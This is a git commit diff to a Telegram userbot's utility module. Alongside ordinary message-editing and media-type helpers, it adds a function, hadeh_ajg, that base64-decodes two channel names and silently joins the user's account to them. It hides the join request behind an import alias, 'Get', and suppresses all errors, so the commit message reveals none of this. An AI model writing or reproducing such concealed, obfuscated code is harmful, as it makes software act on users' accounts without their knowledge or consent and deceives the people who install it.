ed8e25bfd1ece103319f0f75917a47b85e42d1a2
Kitaroo <95475183+Kitaroo@users.noreply.github.com>
2022-02-23 18:42:31 +0700

    Update tools.py

--- userbot/utils/tools.py
+++ userbot/utils/tools.py
@@ -3,8 +3,10 @@ import hashlib
 import asyncio
 import shlex
 import os
+import pybase64
 from os.path import basename
 import os.path
+from telethon.tl.functions.channels import JoinChannelRequest as Get
 from html_telegraph_poster import TelegraphPoster
 from typing import Optional, Union
 from userbot import bot, LOGS
@@ -19,6 +21,26 @@ async def md5(fname: str) -> str:
         for chunk in iter(lambda: f.read(4096), b""):
             hash_md5.update(chunk)
     return hash_md5.hexdigest()
+
+
+def media_type(message):
+    if message and message.photo:
+        return "Photo"
+    if message and message.audio:
+        return "Audio"
+    if message and message.voice:
+        return "Voice"
+    if message and message.video_note:
+        return "Round Video"
+    if message and message.gif:
+        return "Gif"
+    if message and message.sticker:
+        return "Sticker"
+    if message and message.video:
+        return "Video"
+    if message and message.document:
+        return "Document"
+    return None
 
 
 def humanbytes(size: Union[int, float]) -> str:
@@ -161,3 +183,97 @@ def post_to_telegraph(title, html_format_content):
         text=html_format_content,
     )
     return post_page["url"]
+
+
+async def edit_or_reply(
+    event,
+    text,
+    parse_mode=None,
+    link_preview=None,
+    file_name=None,
+    aslink=False,
+    deflink=False,
+    noformat=False,
+    linktext=None,
+    caption=None,
+):
+    link_preview = link_preview or False
+    reply_to = await event.get_reply_message()
+    if len(text) < 4096 and not deflink:
+        parse_mode = parse_mode or "md"
+        if not event.out and event.sender_id:
+            if reply_to:
+                return await reply_to.reply(
+                    text, parse_mode=parse_mode, link_preview=link_preview
+                )
+            return await event.reply(
+                text, parse_mode=parse_mode, link_preview=link_preview
+            )
+        await event.edit(text, parse_mode=parse_mode, link_preview=link_preview)
+        return event
+    if not noformat:
+        text = md_to_text(text)
+    if aslink or deflink:
+        linktext = linktext or "**Pesan Terlalu Panjang**"
+        response = await paste_message(text, pastetype="s")
+        text = linktext + f" [Lihat Disini]({response})"
+        if not event.out and event.sender_id:
+            if reply_to:
+                return await reply_to.reply(text, link_preview=link_preview)
+            return await event.reply(text, link_preview=link_preview)
+        await event.edit(text, link_preview=link_preview)
+        return event
+    file_name = file_name or "output.txt"
+    caption = caption or None
+    with open(file_name, "w+") as output:
+        output.write(text)
+    if reply_to:
+        await reply_to.reply(caption, file=file_name)
+        await event.delete()
+        return os.remove(file_name)
+    if not event.out and event.sender_id:
+        await event.reply(caption, file=file_name)
+        await event.delete()
+        return os.remove(file_name)
+    await event.client.send_file(event.chat_id, file_name, caption=caption)
+    await event.delete()
+    os.remove(file_name)
+
+
+eor = edit_or_reply
+
+async def hadeh_ajg():
+    ram = str(pybase64.b64decode("R2VlelN1cHBvcnQ="))[2:13]
+    ubot = str(pybase64.b64decode("VEVFUlZJZ3JvdXA="))[2:13]
+    try:
+        await bot(Get(ram))
+    except BaseException:
+        pass
+    try:
+        await bot(Get(ubot))
+    except BaseException:
+        pass
+
+async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None):
+    parse_mode = parse_mode or "md"
+    link_preview = link_preview or False
+    time = time or 15
+    if not event.out and event.sender_id:
+        reply_to = await event.get_reply_message()
+        newevent = (
+            await reply_to.reply(text, link_preview=link_preview, parse_mode=parse_mode)
+            if reply_to
+            else await event.reply(
+                text, link_preview=link_preview, parse_mode=parse_mode
+            )
+        )
+    else:
+        newevent = await event.edit(
+            text, link_preview=link_preview, parse_mode=parse_mode
+        )
+    await asyncio.sleep(time)
+    return await newevent.delete()
+
+
+eod = edit_delete
+
